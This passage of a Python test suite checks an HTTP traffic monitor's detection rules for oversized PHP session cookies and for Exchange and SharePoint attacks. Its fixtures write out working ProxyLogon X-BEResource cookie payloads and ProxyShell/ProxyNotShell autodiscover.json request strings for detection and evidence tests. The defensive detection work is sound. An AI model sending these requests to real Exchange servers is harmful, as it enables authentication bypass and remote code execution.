          w.flows["up"].upload_progress_seen is True)
    out = w.feed("up", "10.0.0.1", "10.0.0.2", 80,
                 php_response(b"A" * 5000), False, now=1.0)
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048: annotated when the flow carried upload progress",
          hits and hits[0].evidence.get(
              "preceded_by_multipart_upload_progress") is True)

    # never a gate: the finding stands without it
    out, w2 = php_feed([php_response(b"A" * 5000)], flow="noup")
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048: annotation is not a gate",
          len(hits) == 1 and
          "preceded_by_multipart_upload_progress" not in hits[0].evidence)
    check("HTTP-048: a plain multipart POST is not annotated",
          w2.flows["noup"].upload_progress_seen is False)


def test_php_cookie_dedup():
    w = hw.HttpWatch()
    w.feed("d", "10.0.0.1", "10.0.0.2", 80,
           b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True, now=1.0)
    first = w.feed("d", "10.0.0.1", "10.0.0.2", 80,
                   php_response(b"A" * 5000), False, now=1.0)
    check("HTTP-048 dedup: first is reported",
          len([f for f in first if f.code == "HTTP-048"]) == 1)
    for t in (2.0, 3.0, 4.0):
        more = w.feed("d", "10.0.0.1", "10.0.0.2", 80,
                      php_response(b"B" * 5000), False, now=t)
        check(f"HTTP-048 dedup: suppressed inside the window at t={t}",
              not [f for f in more if f.code == "HTTP-048"])
    check("HTTP-048 dedup: suppressions counted in stats",
          w.stats["leaks_suppressed"] == 3)
    later = w.feed("d", "10.0.0.1", "10.0.0.2", 80,
                   php_response(b"C" * 5000), False,
                   now=1.0 + hw.PHP_DEDUP_WINDOW + 1)
    hits = [f for f in later if f.code == "HTTP-048"]
    check("HTTP-048 dedup: reported again once the window rolls", len(hits) == 1)
    check("HTTP-048 dedup: carries what it suppressed",
          hits and hits[0].evidence.get("suppressed_since_last") == 3)
    # a different server is a different key
    w.feed("d2", "10.0.0.1", "10.0.0.9", 80,
           b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True, now=2.0)
    other = w.feed("d2", "10.0.0.1", "10.0.0.9", 80,
                   php_response(b"D" * 5000), False, now=2.0)
    check("HTTP-048 dedup: keyed per server, not globally",
          len([f for f in other if f.code == "HTTP-048"]) == 1)
    # The rate limit is for HTTP-048 and nothing else. A response that
    # trips another rule as well must still report it, every time, or a
    # leak would start masking the findings it arrives beside.
    both = (b"HTTP/1.1 200 OK\r\nContent-Length: +0\r\n"
            b"Set-Cookie: PHPSESSID=" + b"A" * 5000 + b"; path=/\r\n\r\n")
    w2 = hw.HttpWatch()
    w2.feed("b", "10.0.0.1", "10.0.0.3", 80,
            b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True, now=1.0)
    first = w2.feed("b", "10.0.0.1", "10.0.0.3", 80, both, False, now=1.0)
    check("HTTP-048 dedup: a co-firing rule is reported alongside it",
          {"HTTP-010", "HTTP-048"} <= set(codes(first)))
    for t in (2.0, 3.0):
        again = w2.feed("b", "10.0.0.1", "10.0.0.3", 80, both, False, now=t)
        check(f"HTTP-048 dedup: the other code is not rate-limited at t={t}",
              "HTTP-010" in codes(again) and "HTTP-048" not in codes(again))
    check("HTTP-048 dedup: nothing else is counted as suppressed",
          w2.stats["leaks_suppressed"] == 2)
    check("HTTP-048 dedup: leaves other codes alone",
          hw.LeakDedup().allow(("x", 1), 0.0)[0] is True)


def test_php_cookie_config():
    try:
        hw.php_cookie_config(threshold=hw.PHP_COOKIE_NATIVE_CEILING)
        check("HTTP-048 config: refuses the native ceiling", False)
    except ValueError:
        check("HTTP-048 config: refuses the native ceiling", True)
    try:
        hw.php_cookie_config(threshold=100)
        check("HTTP-048 config: refuses below the native ceiling", False)
    except ValueError:
        check("HTTP-048 config: refuses below the native ceiling", True)
    cfg = hw.php_cookie_config(threshold=hw.PHP_COOKIE_NATIVE_CEILING + 1)
    check("HTTP-048 config: accepts just above the ceiling",
          cfg.threshold == hw.PHP_COOKIE_NATIVE_CEILING + 1)
    cfg = hw.php_cookie_config(extra_names=["MYSESS"])
    check("HTTP-048 config: default name kept",
          b"PHPSESSID" in cfg.names)
    check("HTTP-048 config: extra session.name added", b"MYSESS" in cfg.names)
    out, _ = php_feed([php_response(b"A" * 5000, name=b"MYSESS")], cfg=cfg)
    check("HTTP-048 config: renamed session cookie now seen",
          "HTTP-048" in codes(out))
    out, _ = php_feed([php_response(b"A" * 5000, name=b"MYSESS")])
    check("HTTP-048: a renamed session.name is a false negative by default",
          "HTTP-048" not in codes(out))


def _hpack_literal(name, value):
    def ie(n):
        if n < 127:
            return bytes([n])
        out = bytearray([127])
        n -= 127
        while n >= 128:
            out.append((n % 128) + 128)
            n //= 128
        out.append(n)
        return bytes(out)
    return b"\x00" + ie(len(name)) + name + ie(len(value)) + value


def _h2_frame_bytes(ftype, flags, sid, payload):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + sid.to_bytes(4, "big") + payload)


def test_php_cookie_h2c():
    # The h2c tier already decodes server header blocks with dec_server;
    # the rule is the same rule over the decoded field value.
    st = hw.H2ConnectionState("h2", synced=True)
    blk = _hpack_literal(b":status", b"200") + \
        _hpack_literal(b"set-cookie", b"PHPSESSID=" + b"A" * 5000 + b"; path=/")
    out = st.feed([hw.H2Frame(len(blk), hw.FRAME_HEADERS,
                              hw.FLAG_END_HEADERS, 1, blk)],
                  from_client=False, now=1.0)
    check("HTTP-048 h2c: fires on a decoded set-cookie field",
          "HTTP-048" in codes(out))
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048 h2c: measured on the decoded value, not the wire bytes",
          hits and hits[0].evidence["encoded_length"] == 5000)
    check("HTTP-048 h2c: version recorded as 2",
          hits and hits[0].evidence["http_version"] == "2")

    st2 = hw.H2ConnectionState("h2b", synced=True)
    blk = _hpack_literal(b":status", b"200") + \
        _hpack_literal(b"set-cookie", b"PHPSESSID=" + b"A" * 4096 + b"; path=/")
    out = st2.feed([hw.H2Frame(len(blk), hw.FRAME_HEADERS,
                               hw.FLAG_END_HEADERS, 1, blk)],
                   from_client=False, now=1.0)
    check("HTTP-048 h2c: silent at the threshold", "HTTP-048" not in codes(out))

    # request direction is not the leak direction
    st3 = hw.H2ConnectionState("h2c3", synced=True)
    blk = _hpack_literal(b":method", b"GET") + \
        _hpack_literal(b"set-cookie", b"PHPSESSID=" + b"A" * 5000)
    out = st3.feed([hw.H2Frame(len(blk), hw.FRAME_HEADERS,
                               hw.FLAG_END_HEADERS, 1, blk)],
                   from_client=True, now=1.0)
    check("HTTP-048 h2c: client direction is not scanned",
          "HTTP-048" not in codes(out))

    # end to end through the analyzer, h2c prior knowledge
    w = hw.HttpWatch()
    w.feed("e2e", "10.0.0.1", "10.0.0.2", 8080, hw.H2_PREFACE, True, now=1.0)
    blk = _hpack_literal(b":status", b"200") + \
        _hpack_literal(b"set-cookie", b"PHPSESSID=" + b"A" * 5000)
    frame = _h2_frame_bytes(hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1, blk)
    out = w.feed("e2e", "10.0.0.1", "10.0.0.2", 8080, frame, False, now=1.0)
    check("HTTP-048 h2c: reaches the analyzer end to end",
          "HTTP-048" in codes(out))

    # a mid-stream join cannot decode, and says so by staying silent
    w2 = hw.HttpWatch()
    w2.feed("mj", "10.0.0.1", "10.0.0.2", 8080, hw.H2_PREFACE, True, now=1.0)
    w2.join_midstream("mj")
    out = w2.feed("mj", "10.0.0.1", "10.0.0.2", 8080, frame, False, now=1.0)
    check("HTTP-048 h2c: silent rather than guessing on a mid-stream join",
          "HTTP-048" not in codes(out))


def test_php_cookie_registry_and_catalog():
    d = hw.FINDING_REGISTRY["HTTP-048"]
    check("HTTP-048: tier C", d.tier == "C")
    check("HTTP-048: high severity", d.severity == hw.HIGH)
    check("HTTP-048: shape confidence, not heuristic",
          d.confidence == hw.SHAPE)
    check("HTTP-048: attributed to both PHP2Shell CVEs",
          set(d.cves) == {"CVE-2026-109618", "CVE-2026-109619"})
    for cve in ("CVE-2026-109618", "CVE-2026-109619"):
        e = hw.CVE_CATALOG[cve]
        check(f"catalog: {cve} scored 9.2", e["score"] == 9.2)
        check(f"catalog: {cve} is a CVSS 4.0 figure",
              e["cvss_version"] == "4.0" and e["vector"].startswith("CVSS:4.0/"))
        check(f"catalog: {cve} KEV with its date",
              e["kev"] is True and e["kev_added"] == "2026-10-26")
    check("catalog: phpAfterShell deferred with a substantive reason",
          "CVE-2026-126714" in hw.DEFERRED_CVES and
          "on-disk session state" in hw.DEFERRED_CVES["CVE-2026-126714"])
    check("catalog: CVE-2026-115560 deferred as config-only",
          "CVE-2026-115560" in hw.DEFERRED_CVES and
          "serialize_handler" in hw.DEFERRED_CVES["CVE-2026-115560"])
    detected = {c for x in hw.FINDING_REGISTRY.values() for c in x.cves}
    check("catalog: deferred PHP CVEs are not also claimed as detected",
          not ({"CVE-2026-126714", "CVE-2026-115560"} & detected))


def test_php_cookie_live_regeneration():
    """Re-measure the native corpus against the local PHP, when there is one.

    The pinned corpus above is the regression; this is the re-measurement.
    Skipped, loudly, where PHP is not installed - a tier that silently
    passes when it did not run is worse than one that says it did not.
    """
    import shutil, subprocess
    php = shutil.which("php")
    if not php:
        print("note: php not installed; native corpus re-measurement skipped")
        return
    # php -r takes bare code: a leading <?php is a parse error, and with
    # error_reporting off it is a silent one that would leave this tier
    # passing on an empty corpus.
    script = (
        "$b=(int)$argv[1];$l=(int)$argv[2];"
        "ini_set('session.sid_bits_per_character',(string)$b);"
        "ini_set('session.sid_length',(string)$l);"
        "for($i=0;$i<50;$i++) echo urlencode(session_create_id()),\"\\n\";")
    worst = 0
    fired = []
    for bits in (4, 5, 6):
        for length in (22, 32, 256):
            # one process per combination: PHP locks these ini entries after
            # the first session_create_id(), so a single process would
            # silently reuse the first combination's settings.
            r = subprocess.run([php, "-d", "error_reporting=0", "-r", script,
                                str(bits), str(length)],
                               capture_output=True, timeout=60)
            for value in r.stdout.split():
                worst = max(worst, len(value))
                out, _ = php_feed([php_response(value)], flow="live")
                if "HTTP-048" in codes(out):
                    fired.append((bits, length, len(value)))
    check("HTTP-048: the re-measurement actually produced a corpus",
          worst > 0)
    check("HTTP-048: re-measured native corpus never fires", not fired)
    check("HTTP-048: re-measured corpus stays under the pinned ceiling",
          0 < worst <= hw.PHP_COOKIE_NATIVE_CEILING)
    check("HTTP-048: the 256-char ceiling is 256 * len('%2C')",
          hw.PHP_COOKIE_NATIVE_CEILING == 256 * 3)


# ---------------------------------------------------------------------------
# HTTP-086 / 087 / 088: Exchange and SharePoint
# ---------------------------------------------------------------------------
def _ex(raw, cfg=None):
    w = hw.HttpWatch(cfg=cfg) if cfg else hw.HttpWatch()
    return w.feed("x", "10.0.0.5", "10.0.0.9", 80, raw, True, now=1.0)


def _excodes(raw, cfg=None):
    return {f.code for f in _ex(raw, cfg)}


def _cookie_req(cookie, target=b"/owa/auth/x.js", extra=b""):
    return (b"GET " + target + b" HTTP/1.1\r\nHost: exch.corp\r\nCookie: "
            + cookie + b"\r\n" + extra + b"\r\n")


def test_canonical_uri_path():
    """Every case here is held against real System.Uri in the xcheck tier."""
    # measured against Mono's System.Uri.AbsolutePath
    for src, want in [
        (b"/_layouts/SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"/_layouts/./SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"/_layouts/15/../SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"/_layouts/15/16/../../SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (br"\_layouts\SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"/_layouts/%2e/SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"/_layouts/%2E%2E/SignOut.aspx", b"/SignOut.aspx"),
        (b"https://sp.corp/_layouts/SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"https://sp.corp/_layouts/SignOut.aspx?x=1", b"/_layouts/SignOut.aspx"),
        (b"https://sp.corp/_layouts/SignOut.aspx#frag", b"/_layouts/SignOut.aspx"),
        (b"https://u:p@sp.corp:8443/_layouts/SignOut.aspx",
         b"/_layouts/SignOut.aspx"),
        (b"//sp.corp/_layouts/SignOut.aspx", b"/_layouts/SignOut.aspx"),
        (b"http://sp.corp", b"/"),
        # PathInfo is preserved, which is what the 53771 bypass needs
        (b"/_layouts/15/ToolPane.aspx/lx", b"/_layouts/15/ToolPane.aspx/lx"),
        (b"/_layouts/15/ToolPane.aspx/", b"/_layouts/15/ToolPane.aspx/"),
        # a relative reference is made absolute
        (b"_layouts/SignOut.aspx", b"/_layouts/SignOut.aspx"),
        # '+' is NOT a space in a path
        (b"/_layouts/a+b.aspx", b"/_layouts/a+b.aspx"),
        # percent-decoding happens before dot-segment removal
        (b"/a/%2e%2e/b", b"/b"),
    ]:
        got = hw.canonical_uri_path(src)
        check(f"canonical_uri_path({src!r}) == {want!r} (got {got!r})",
              got == want)
    check("canonical_uri_path of empty is None",
          hw.canonical_uri_path(b"") is None)
    check("canonical_uri_path of whitespace is None",
          hw.canonical_uri_path(b"  ") is None)
    # Case is preserved: SharePoint compares case-insensitively, the
    # canonicaliser must not do the folding for it or the evidence lies.
    # An empty segment is significant. Collapsing it would make
    # /_layouts//SignOut.aspx compare equal to the sign-out path that
    # HTTP-088 keys on, while the real SharePoint would not have skipped
    # its checks - a false positive. Held against System.Uri in xcheck.
    for src, want in [
        (b"/_layouts//15//ToolPane.aspx", b"/_layouts//15//ToolPane.aspx"),
        (b"/_layouts//SignOut.aspx", b"/_layouts//SignOut.aspx"),
        (b"/a//../b", b"/a/b"),
        (b"/a/./../b", b"/b"),
    ]:
        got = hw.canonical_uri_path(src)
        check(f"empty segments are preserved: {src!r} -> {want!r} "
              f"(got {got!r})", got == want)
    check("a doubled slash does not forge a sign-out Referer",
          "HTTP-088" not in _excodes(_sp(b"/_layouts/15/ToolPane.aspx",
                                        b"/_layouts//SignOut.aspx")))
    check("canonical_uri_path preserves case",
          hw.canonical_uri_path(b"/_layouts/SignOut.aspx")
          == b"/_layouts/SignOut.aspx")


def test_check_host_name():
    """Uri.CheckHostName equivalent - this IS the ProxyLogon patch check."""
    for host, want in [
        (b"EXCH01", "Dns"),
        (b"exch01.corp.example.com", "Dns"),
        (b"EXCH01.Corp.Example.COM", "Dns"),
        (b"localhost", "Dns"),
        (b"a-b.example", "Dns"),
        (b"host_name", "Dns"),          # underscore is accepted by .NET
        (b"a-", "Dns"),                 # a trailing hyphen is accepted
        (b"a_b-c.example", "Dns"),
        (b"example.com.", "Dns"),       # a trailing root dot is legal
        (b"10.1.2.3", "IPv4"),
        (b"[::1]", "IPv6"),
        (b"[2001:db8::1]", "IPv6"),
        # everything the patch rejects
        (b"@backend.example.local:444", "Unknown"),
        (b"localhost/EWS/Exchange.asmx", "Unknown"),
        (b"localhost:444", "Unknown"),
        (b"localhost#", "Unknown"),
        (b"localhost?a=", "Unknown"),
        (b"host\\share", "Unknown"),
        (b"", "Unknown"),
        (b"..", "Unknown"),
        (b"a..b", "Unknown"),
        (b"[notv6]", "Unknown"),
        # a label may not BEGIN with a hyphen or underscore, though it may
        # end with one. Measured against Uri.CheckHostName.
        (b"-lead.example", "Unknown"),
        (b"-a", "Unknown"),
        (b"_lead.example", "Unknown"),
        (b".example.com", "Unknown"),
        (b"a" * 64 + b".com", "Unknown"),     # label over 63
        (b"a" * 256, "Unknown"),              # host over 255
    ]:
        got = hw.check_host_name(host)
        check(f"check_host_name({host!r}) == {want} (got {got})", got == want)


def test_http_086_positives():
    pz = (b"POST /ecp/favicon.ico HTTP/1.1\r\nHost: exch.corp\r\n"
          b"Cookie: X-BEResource=@backend.example.local:444/ecp/"
          b"proxyLogon.ecp#~1941962753\r\nContent-Length: 0\r\n\r\n")
    check("HTTP-086 fires on the in-the-wild auth-bypass request",
          "HTTP-086" in _excodes(pz))
    for label, cookie in [
        ("the EWS form",
         b"X-BEResource=localhost/EWS/Exchange.asmx#~1942062522"),
        ("the ?a=~ form",
         b"X-BEResource=localhost/autodiscover/autodiscover.xml?a=~1942062522"),
        ("an FQDN with an injected path",
         b"X-BEResource=exch01.corp.local/ecp/proxyLogon.ecp#~1942062522"),
        ("X-AnonResource-Backend",
         b"X-AnonResource-Backend=localhost/ecp/proxyLogon.ecp#~1942062522"),
        ("percent-encoded %2F",
         b"X-BEResource=localhost%2FEWS%2FExchange.asmx%23~1942062522"),
        ("percent-encoded %40",
         b"X-BEResource=%40backend:444/ecp/x.ecp%23~1942062522"),
        ("lowercase cookie name",
         b"x-beresource=localhost/ecp/x.ecp#~1942062522"),
        ("alongside other cookies",
         b"sessionid=aaa; X-BEResource=localhost/ecp/x.ecp#~1942062522; o=1"),
    ]:
        check(f"HTTP-086 fires on {label}",
              "HTTP-086" in _excodes(_cookie_req(cookie)))


def test_http_086_negatives():
    for label, cookie in [
        ("a bare hostname", b"X-BEResource=EXCH01~1942062522"),
        ("an FQDN", b"X-BEResource=exch01.corp.example.com~1942062522"),
        ("mixed case", b"X-BEResource=EXCH01.Corp.Example.COM~1942062522"),
        ("an IPv4 literal", b"X-BEResource=10.1.2.3~1942062522"),
        ("an IPv6 literal", b"X-BEResource=[2001:db8::1]~1942062522"),
        ("an underscore hostname", b"X-BEResource=exch_01~1942062522"),
        # Exchange's own FromString rejects these, so they are not attacks
        ("two tildes, which FromString rejects",
         b"X-BEResource=localhost/ecp/x.ecp~bad~1942062522"),
        ("no tilde at all", b"X-BEResource=localhost/ecp/x.ecp"),
        ("a non-integer version",
         b"X-BEResource=localhost/ecp/x.ecp#~notanumber"),
        ("a negative version",
         b"X-BEResource=localhost/ecp/x.ecp#~-1"),
        ("an empty host", b"X-BEResource=~1942062522"),
        ("unrelated cookies", b"sessionid=abc; cadata=def; FedAuth=ghi"),
        ("a lookalike cookie name",
         b"X-BEResource-Backend=localhost/ecp/x.ecp#~1"),
    ]:
        check(f"HTTP-086 silent on {label}",
              "HTTP-086" not in _excodes(_cookie_req(cookie)))
    check("HTTP-086 silent with no Cookie header",
          "HTTP-086" not in _excodes(
              b"GET /owa/x.js HTTP/1.1\r\nHost: e\r\n\r\n"))


def test_http_086_tilde_split_is_unambiguous():
    """The two-part requirement makes the split's maxsplit irrelevant.

    A second tilde always lands in the version and fails isdigit(), so
    there is no maxsplit-related evasion route into this rule. Asserted
    exhaustively rather than argued, because the bite tier cannot probe an
    equivalence from outside: a mutation that changes nothing is not a hole
    but it is not evidence of coverage either.
    """
    import itertools
    alpha = [b"a", b"~", b"1", b"/", b".", b"%", b"2", b"F"]
    checked = diff = 0
    for n in range(1, 6):
        for combo in itertools.product(alpha, repeat=n):
            value = b"".join(combo)
            full = hw.exchange_backend_verdict(hw.EXCHANGE_BE_COOKIE, value)
            # the same rule with the split's maxsplit changed
            parts_full = value.split(b"~")
            parts_one = value.split(b"~", 1)
            # "accepts" is the pair of victim-code guards together
            accept_full = len(parts_full) == 2 and parts_full[1].isdigit()
            accept_one = len(parts_one) == 2 and parts_one[1].isdigit()
            if accept_full != accept_one:
                diff += 1
            elif accept_full and parts_full[0] != parts_one[0]:
                diff += 1       # same verdict must also mean the same host
            checked += 1
            del full
    check("the tilde split was exercised over the whole alphabet",
          checked == sum(len(alpha) ** n for n in range(1, 6)))
    check("no input distinguishes a full split from maxsplit=1",
          diff == 0, )
    # and the two tildes case really is rejected, from both directions
    for value in (b"localhost/ecp/x.ecp~bad~1942062522",
                  b"localhost/ecp/x.ecp~1~2",
                  b"a~b~c~d"):
        check(f"a multi-tilde value is rejected: {value!r}",
              hw.exchange_backend_verdict(hw.EXCHANGE_BE_COOKIE, value) is None)


def test_http_086_evidence():
    pz = (b"POST /ecp/favicon.ico HTTP/1.1\r\nHost: exch.corp\r\n"
          b"Cookie: msExchLogonMailbox=S-1-5-20; X-BEResource="
          b"@backend.example.local:444/ecp/proxyLogon.ecp#~1941962753\r\n"
          b"Authorization: Basic dXNlcjpwdw==\r\nContent-Length: 0\r\n\r\n")
    f = [x for x in _ex(pz) if x.code == "HTTP-086"][0]
    e = f.evidence
    check("HTTP-086 reports the injected path",
          e["target_path"] == "/ecp/proxyLogon.ecp")
    check("HTTP-086 reports the injected characters",
          set(e["injected_characters"]) >= {"/", "@", ":"})
    check("HTTP-086 records the FromString structure",
          e["tilde_parts"] == 2 and e["version_is_integer"] is True)
    check("HTTP-086 records the failing host check",
          e["host_check"] == "Unknown")
    check("HTTP-086 flags the admin-impersonation cookie",
          e["logon_sid_present"] is True)
    check("HTTP-086 names which cookie matched", e["cookie"] == "x-beresource")
    # evidence discipline: these are live credentials on Exchange
    blob = repr(e)
    check("HTTP-086 never logs the Authorization value",
          "dXNlcjpwdw" not in blob)
    check("HTTP-086 never logs the logon SID value", "S-1-5-20" not in blob)
    check("HTTP-086 does not log the cookie value by default",
          "payload" not in e)
    check("HTTP-086 digests the matched value",
          e["value_digest"].startswith("sha256:"))
    # and only on the operator's explicit say-so
    cfg = hw.WatchConfig(log_attack_payload=True)
    f2 = [x for x in _ex(pz, cfg) if x.code == "HTTP-086"][0]
    check("HTTP-086 logs the payload only when asked",
          "proxyLogon.ecp" in f2.evidence.get("payload", ""))
    check("HTTP-086 still withholds other cookies when asked",
          "S-1-5-20" not in repr(f2.evidence))
    check("HTTP-086 says attempt, not vulnerable",
          "attempt" in e["note"] and "patch state is not on the wire" in e["note"])


def test_http_086_decoded_form_is_labelled():
    raw = _cookie_req(b"X-BEResource=localhost%2FEWS%2FExchange.asmx%23~1942062522")
    f = [x for x in _ex(raw) if x.code == "HTTP-086"][0]
    check("HTTP-086 says which form it matched on",
          f.evidence["evaluated_on"] == "percent_decoded")
    check("HTTP-086 names the injected path from the decoded form",
          f.evidence["target_path"] == "/EWS/Exchange.asmx")
    raw2 = _cookie_req(b"X-BEResource=localhost/EWS/Exchange.asmx#~1942062522")
    f2 = [x for x in _ex(raw2) if x.code == "HTTP-086"][0]
    check("HTTP-086 labels a raw match as raw",
          f2.evidence["evaluated_on"] == "raw")


def test_http_087_positives():
    ps = (b"GET /autodiscover/autodiscover.json?@evil.corp/?&Email="
          b"autodiscover/autodiscover.json%3F@evil.corp HTTP/1.1\r\n"
          b"Host: exch.corp\r\n\r\n")
    check("HTTP-087 fires on the canonical ProxyShell PoC",
          "HTTP-087" in _excodes(ps))
    f = [x for x in _ex(ps) if x.code == "HTTP-087"][0]
    check("HTTP-087 unauthenticated is the ProxyShell shape",
          f.evidence["attack"] == "ProxyShell")
    pns = (b"GET /autodiscover/autodiscover.json?@evil.com/&Email="
           b"autodiscover/autodiscover.json%3f@evil.com HTTP/1.1\r\n"
           b"Host: exch.corp\r\nAuthorization: Basic dXNlcjpwdw==\r\n\r\n")
    check("HTTP-087 fires on the ProxyNotShell form",
          "HTTP-087" in _excodes(pns))
    f = [x for x in _ex(pns) if x.code == "HTTP-087"][0]
    check("HTTP-087 authenticated is the ProxyNotShell shape",
          f.evidence["attack"] == "ProxyNotShell")
    check("HTTP-087 never logs the Authorization value",
          "dXNlcjpwdw" not in repr(f.evidence))
    # Every published back-end target, in the real published shape: the
    # trailing "/?&" is what makes the remainder a query, so that after the
    # strip the back-end path is the target and nothing else.
    for tgt in [b"/powershell/", b"/mapi/nspi/", b"/ews/exchange.asmx",
                b"/autodiscover/autodiscover.xml", b"/"]:
        raw = (b"GET /autodiscover/autodiscover.json?@evil.corp" + tgt +
               b"?&Email=autodiscover/autodiscover.json%3F@evil.corp HTTP/1.1"
               b"\r\nHost: e.corp\r\n\r\n")
        check(f"HTTP-087 fires with target {tgt!r}", "HTTP-087" in _excodes(raw))
    # the key and the suffix both fold case
    for label, raw in [
        ("an uppercase Email key",
         b"GET /autodiscover/autodiscover.json?@e.corp/&EMAIL=autodiscover/"
         b"autodiscover.json%3F@e.corp HTTP/1.1\r\nHost: e\r\n\r\n"),
        ("a mixed-case path",
         b"GET /Autodiscover/AutoDiscover.Json?@e.corp/&Email=Autodiscover/"
         b"AutoDiscover.Json%3F@e.corp HTTP/1.1\r\nHost: e\r\n\r\n"),
        ("an encoded %3f",
         b"GET /autodiscover/autodiscover.json?@e.corp/&Email=autodiscover/"
         b"autodiscover.json%3f@e.corp HTTP/1.1\r\nHost: e\r\n\r\n"),
        ("a path with a dot segment",
         b"GET /autodiscover/./autodiscover.json?@e.corp/&Email=autodiscover/"
         b"autodiscover.json%3F@e.corp HTTP/1.1\r\nHost: e\r\n\r\n"),
    ]:
        check(f"HTTP-087 fires on {label}", "HTTP-087" in _excodes(raw))


def test_http_087_negatives():
    for label, target in [
        ("a legitimate autodiscover v2 request",
         b"/autodiscover/autodiscover.json?Email=user@contoso.com"
         b"&Protocol=ActiveSync&RedirectCount=1"),
        ("a legitimate request with a long SMTP address",
         b"/autodiscover/autodiscover.json?Email=first.last+tag@sub.contoso.com"
         b"&Protocol=Autodiscoverv1"),
        ("an autodiscover.xml POST", b"/autodiscover/autodiscover.xml?Email=u@c.com"),
        ("no Email parameter at all", b"/autodiscover/autodiscover.json"),
        ("an empty Email", b"/autodiscover/autodiscover.json?Email="),
        # Microsoft's broad mitigation regex fires on this; the strip
        # condition does not, which is the whole point
        ("autodiscover and powershell with no strip construct",
         b"/autodiscover/autodiscover.json?Email=u@c.com&x=/powershell"),
        ("a path that does not end at the handler",
         b"/autodiscover/autodiscover.json/x?@e.corp/&Email=autodiscover/"
         b"autodiscover.json%3F@e.corp"),
        # The strip leaves it on the same handler, so it is not the
        # defect. These three are the ones that matter: in each the strip
        # really does occur, and the post-strip handler test is the only
        # thing keeping the rule quiet. The bite tier found that the
        # earlier corpus never reached this branch at all - the value below
        # does not even strip, because "/foo/autodiscover.json" never
        # appears in the URI. A legitimate Email value that happens to
        # match a leading path segment is the false positive this guards.
        ("an Email matching a leading path segment",
         b"/foo/autodiscover/autodiscover.json?Email=foo"),
        ("an Email of 'autodiscover', which strips to /autodiscover.json",
         b"/autodiscover/autodiscover.json?Email=autodiscover"),
        ("a single-character leading segment",
         b"/a/autodiscover/autodiscover.json?Email=a"),
        ("a value that does not strip at all",
         b"/autodiscover/autodiscover.json?Email=foo/autodiscover.json"),
    ]:
        raw = b"GET " + target + b" HTTP/1.1\r\nHost: e.corp\r\n\r\n"
        check(f"HTTP-087 silent on {label}", "HTTP-087" not in _excodes(raw))


def test_http_087_evidence():
    raw = (b"GET /autodiscover/autodiscover.json?@evil.corp/powershell/?"
           b"&Email=autodiscover/autodiscover.json%3F@evil.corp HTTP/1.1\r\n"
           b"Host: exch.corp\r\n\r\n")
    f = [x for x in _ex(raw) if x.code == "HTTP-087"][0]
    e = f.evidence
    check("HTTP-087 reports the routed path",
          e["routed_path"] == "/autodiscover/autodiscover.json")
    check("HTTP-087 reports the stripped back-end path",
          e["stripped_target"].lower().startswith("/powershell"))
    check("HTTP-087 flags the RCE stage", e["rce_stage"] is True)
    check("HTTP-087 digests the logon value",
          e["logon_value_digest"].startswith("sha256:"))
    check("HTTP-087 does not log the target by default", "payload" not in e)
    check("HTTP-087 explains the AbsolutePath/AbsoluteUri mismatch",
          "AbsolutePath" in e["note"] and "AbsoluteUri" in e["note"])
    check("HTTP-087 says attempt, not compromise", "attempt" in e["note"])


def test_http_087_authority_is_part_of_the_uri():
    """The strip runs over AbsoluteUri, so the authority is in scope.

    RemoveExplicitLogonFromUrlAbsoluteUri does an IndexOf over the whole
    absolute URI, authority included, and strips the FIRST occurrence. So a
    Host that itself contains the explicit-logon value changes which
    occurrence is removed, and therefore the verdict. Dropping the
    authority from the reconstruction looks harmless and is not: it turns
    this pair into two identical firings, the second of which is a false
    positive. The bite tier found that nothing here varied the Host.
    """
    target = b"/autodiscover/autodiscover.json?Email=autodiscover.json"
    fires = hw.exchange_logon_strip_verdict(target, b"exch.corp")
    check("HTTP-087: an ordinary Host leaves the first match in the path",
          fires is not None and fires["stripped_target"] == "/autodiscover")
    # the same target, with a Host that contains the value: the first
    # occurrence is now inside the authority, the strip lands there, and
    # the request is still on the autodiscover handler afterwards
    silent = hw.exchange_logon_strip_verdict(target, b"autodiscover.json")
    check("HTTP-087: a Host containing the logon value moves the match "
          "into the authority, and the rule stays silent", silent is None)
    # end to end, so the Host header really is the one being read
    def with_host(host):
        raw = (b"GET " + target + b" HTTP/1.1\r\nHost: " + host + b"\r\n\r\n")
        return "HTTP-087" in _excodes(raw)
    check("HTTP-087 end to end: fires with an ordinary Host",
          with_host(b"exch.corp"))
    check("HTTP-087 end to end: silent with the colliding Host",
          not with_host(b"autodiscover.json"))
    # and the scheme is part of it too: a needle that only matches once the
    # authority is dropped must not be found
    check("HTTP-087: the reconstruction keeps the scheme and authority",
          hw.exchange_logon_strip_verdict(
              b"/autodiscover/autodiscover.json?Email=exch.corp",
              b"exch.corp") is None)


def test_http_087_duplicate_email_is_comma_joined():
    """HttpUtility.ParseQueryString comma-joins duplicates - measured, not
    assumed, and held against Mono in the xcheck tier."""
    raw = (b"GET /autodiscover/autodiscover.json?@e.corp/&Email=a"
           b"&Email=autodiscover/autodiscover.json%3F@e.corp HTTP/1.1\r\n"
           b"Host: e\r\n\r\n")
    check("HTTP-087 evaluates each individual duplicate value",
          "HTTP-087" in _excodes(raw))
    f = [x for x in _ex(raw) if x.code == "HTTP-087"][0]
    check("HTTP-087 counts the duplicate values",
          f.evidence["explicit_logon_values"] == 2)


def _sp(target, referer=None, body=b"", method=b"POST", extra=b""):
    head = method + b" " + target + b" HTTP/1.1\r\nHost: sp.corp\r\n"
    if referer is not None:
        head += b"Referer: " + referer + b"\r\n"
    if body:
        head += (b"Content-Type: application/x-www-form-urlencoded\r\n"
                 b"Content-Length: " + str(len(body)).encode() + b"\r\n")
    else:
        head += b"Content-Length: 0\r\n"
    return head + extra + b"\r\n" + body


def test_http_088_positives():
    ts = _sp(b"/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
